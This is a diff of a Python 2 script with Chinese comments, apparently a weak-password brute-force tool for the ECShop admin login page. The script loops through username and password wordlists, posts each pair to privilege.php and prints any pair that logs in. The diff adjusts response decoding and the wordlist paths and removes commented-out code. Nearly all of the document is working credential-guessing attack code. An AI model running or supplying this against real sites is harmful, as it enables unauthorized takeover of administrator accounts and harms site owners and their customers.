@@ -28,7 +28,7 @@ class  WeakPass(object):
 		self.proto = proto
 		self.head = head
 		self.result = [];
-	#从文件中读取信息放入数组中
+	#从文件中读取信息放入数组中,读取的为用户名密码
 	def __readfile(self,filename):
 		arr = []
 		with open(filename) as f:
@@ -48,12 +48,11 @@ class  WeakPass(object):
 	#验证方式，针对每一个用户名密码判断
 	def __verify(self,username,password):
 		response = self.__fetch(username,password)
-		if self.proto in response:
+		#以utf-8解码
+		if self.proto in response.decode("utf-8"):
 			print "[*]found username,password ",username,password
 	def __fetch(self,username,password):
 		req = urllib2.Request(self.url)  
-		# response = urllib2.urlopen('http://localhost/ecshop/admin/privilege.php?act=login')
-		# data = urllib.urlencode(self.data) 
 		opener = urllib2.build_opener(urllib2.HTTPCookieProcessor()) 
 		data = self.data
 		data = data.replace("_username",username)
@@ -66,17 +65,5 @@ if __name__ == '__main__':
 	url = "http://localhost/ecshop/admin/privilege.php"
 	data = "username=_username&password=_password&act=signin"
 	proto = "http://api.ecshop.com/record.php"
-	#主要是参数的注入
-	weakPass = WeakPass(url = url,userfile="usr.txt",passfile="pwd.txt",data = data,proto = proto)
+	weakPass = WeakPass(url = url,userfile="../usr.txt",passfile="../pwd.txt",data = data,proto = proto)
 	weakPass.exploit()
-	# s = u'上平'  
-	# print s
-	# gevent.sleep(3);
-	
-	# def post(url, data):  
-	# 	req = urllib2.Request(url)  
-	# 	data = urllib.urlencode(data)  
-	#     #enable cookie  
-	# 	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())  
-	# 	response = opener.open(req, data)  
-	# 	return response.read()  	
